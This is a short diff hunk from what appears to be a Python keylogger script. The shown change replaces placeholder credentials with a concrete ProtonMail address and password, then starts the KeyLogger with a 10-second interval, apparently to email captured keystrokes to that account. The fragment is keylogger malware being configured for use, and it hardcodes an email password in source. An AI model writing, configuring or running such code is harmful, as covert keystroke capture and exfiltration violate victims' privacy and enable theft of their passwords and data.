@@ -117,8 +117,8 @@ class KeyLogger:
                 print('File is close.')
 
 
-email_address = "YOUR MAIL"
-password = "YOUR PASSWORD"
+email_address = "753951951@protonmail.com"
+password = "456852654"
 
 keylogger = KeyLogger(10, email_address, password)
 keylogger.run()
